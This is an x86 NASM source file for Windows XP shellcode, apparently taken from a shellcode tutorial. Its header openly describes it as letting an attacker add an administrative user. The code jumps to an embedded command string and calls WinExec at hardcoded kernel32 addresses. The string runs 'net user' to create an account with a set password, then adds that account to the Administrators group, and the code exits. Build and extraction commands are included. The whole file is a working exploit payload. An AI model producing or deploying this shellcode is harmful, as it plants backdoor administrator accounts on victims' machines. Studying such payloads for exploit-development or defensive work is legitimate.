; Executable name : adduser
; Designed OS     : Windows XP
; Version         : 1.0
; Origin          : http://www.vividmachines.com/shellcode/shellcode.html
; Description     : This allows the attacker to add an administrative user.
;                   This code does not require the loading of extra libraries
;                   into the process space because the only functions we will
;                   be using are WinExec and ExitProcess.
;
; Found Using:
;	arwin.exe kernel32.dll ExitProcess -> 0x7c81caa2
;	arwin.exe kernel32.dll WinExec     -> 0x7c86114d
;
; Build using these commands && extract shellcode:
;	nasm -f elf adduser.asm; ld -o adduser adduser.o; objdump -d adduser
;

SECTION .text

global _start

_start:
	jmp short GetCommand		; make a short jump to GetCommand

CommandReturn:
	pop ebx				; ebx now holds the handle to the string
	xor eax,eax			; zero out
	push eax			; push eax onto stack
	xor eax,eax			; for some reason the registers can be very volatile, did this just in case
	mov [ebx+89],al			; insert the NULL character
	push ebx			; push ebx onto the stack
	mov ebx,0x7c86114d		; put WinExec into ebx
	call ebx			; call WinExec(path,showcode)

	xor eax,eax			; zero the register again, clears winexec retval
	push eax			; push eax onto the stack
	mov ebx,0x7c81caa2		; put ExitProcess into ebx
	call ebx			; call ExitProcess(0)

GetCommand:
	call CommandReturn		; go to CommandReturn
	; NOTE the N at the end of the db will be replaced with a null character
	db "cmd.exe /c net user wetw0rk PW$#d /ADD && net localgroup Administrators /ADD wetw0rkN"
